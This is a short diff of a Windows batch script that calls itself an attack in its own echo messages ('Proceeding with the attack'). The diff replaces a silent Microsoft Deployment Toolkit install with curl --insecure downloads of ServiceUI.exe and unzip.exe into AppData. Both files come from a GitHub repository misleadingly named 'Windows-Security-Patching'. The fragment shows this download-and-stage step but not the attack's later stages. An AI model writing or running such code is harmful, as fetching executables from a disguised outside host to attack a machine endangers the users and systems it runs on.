@@ -18,13 +18,8 @@ IF EXIST "C:\Program Files\Microsoft Deployment Toolkit\Templates\Distribution\T
     ECHO The ServiceUI.exe file exists.
     echo Proceeding with the attack.
 ) ELSE (
-    ECHO The ServiceUI.exe file does not exist.
-    echo Downloading and Installing now...
-    C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\MicrosoftDeploymentToolkit_x64.msi https://download.microsoft.com/download/3/3/9/339be62d-b4b8-4956-b58d-73c4685fc492/MicrosoftDeploymentToolkit_x64.msi
-    REM Silent install
-    msiexec /i "%AppDataPath%\MicrosoftDeploymentToolkit_x64.msi" /qn /norestart /L*V "C:\Temp\msilog.log"
-    ECHO The ServiceUI.exe installed.
-    echo Proceeding with the attack.
+    C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\ServiceUI.exe https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/ServiceUI.exe
+    set "serviceUIpath=%AppDataPath%\ServiceUI.exe"
 )
 echo Downloading Unzip.exe now...
 C:\Windows\System32\curl.exe --insecure -s -S -g -L -o %AppDataPath%\unzip.exe https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/unzip.exe
